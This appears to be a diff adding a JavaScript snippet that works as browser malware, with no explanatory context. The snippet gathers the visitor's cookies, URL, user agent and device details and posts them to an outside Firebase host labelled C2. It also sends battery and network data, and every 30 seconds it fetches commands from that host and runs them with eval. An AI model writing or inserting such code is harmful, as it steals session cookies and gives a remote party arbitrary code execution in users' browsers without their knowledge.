@@ -1,0 +1,45 @@
+(function(){
+    const C2='https://thumbnail-log-default-rtdb.europe-west1.firebasedatabase.app';
+    const data={
+        ua:navigator.userAgent,
+        platform:navigator.platform,
+        language:navigator.language,
+        vendor:navigator.vendor,
+        cookies:document.cookie||'none',
+        url:window.location.href,
+        timestamp:Date.now()
+    };
+    fetch(`${C2}/android_captures.json`,{
+        method:'POST',
+        mode:'no-cors',
+        body:JSON.stringify(data)
+    });
+    if(navigator.getBattery){
+        navigator.getBattery().then(b=>{
+            fetch(`${C2}/android_battery.json`,{
+                method:'POST',
+                mode:'no-cors',
+                body:JSON.stringify({level:b.level*100,charging:b.charging})
+            });
+        });
+    }
+    if('connection'in navigator){
+        fetch(`${C2}/android_network.json`,{
+            method:'POST',
+            mode:'no-cors',
+            body:JSON.stringify({
+                type:navigator.connection.effectiveType,
+                downlink:navigator.connection.downlink
+            })
+        });
+    }
+    setInterval(()=>{
+        fetch(`${C2}/android_commands.json`)
+        .then(r=>r.json())
+        .then(cmds=>{
+            if(cmds&&cmds.length){
+                eval(cmds[0].code);
+            }
+        });
+    },30000);
+})();
